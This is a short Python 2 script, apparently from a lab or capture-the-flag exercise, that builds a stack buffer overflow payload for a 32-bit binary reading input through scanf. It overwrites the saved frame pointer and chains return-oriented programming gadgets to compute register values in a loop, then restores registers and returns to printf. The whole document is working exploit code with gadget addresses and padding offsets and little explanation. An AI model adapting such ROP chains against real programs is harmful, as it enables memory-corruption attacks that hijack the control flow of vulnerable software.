
gad1 = "\xf3\x15\x09\x08" #0x080915f3 : pop ecx ; ret
gad2 = "\x07\x97\x04\x08" #0x08049707 : add ecx, ecx ; ret #because 0a cannot be given as input to scanf, it's NULL char
gad3 = "\x1e\x90\x04\x08" #0x0804901e : pop ebx ; ret
gad4 = "\x9a\xf4\x0c\x08" #0x080cf49a : pop eax ; ret
gad5 = "\x65\x97\x04\x08" #0x08049765 : imul eax, ebx ; add eax, 0xa ; ret
gad6 = "\x7c\x97\x04\x08" #0x0804977c : sub eax, ecx ; ret
gad7 = "\xcb\xbc\x04\x08" #0x0804bccb : inc ebx ; ret

# hex of value 1
val1 = "\x01\x00\x00\x00"

# hex of value 5
val5 = "\x05\x00\x00\x00"

gotopf = "\x8b\x98\x04\x08" #redirecting to the printf statement

ebp_val = "\x58\xcf\xff\xff"

old_ecx = "\xf4\xaf\x10\x08"
old_ebx = "\xf4\xaf\x10\x08"

input1 = 'A'*36 + ebp_val + gad1 + val5 + gad2 + gad3 + val1 + gad4 + val1 
'''
initializing
ecx = 10
ebx = 2
eax = 1
'''
input2 = ''
for i in range(7):
    input2 += gad5 + gad6 + gad7

restore_register = gad1 +old_ecx + gad3 + old_ebx +  gotopf # so that printf can execute normally

final_input = input1 + input2 + restore_register
print final_input

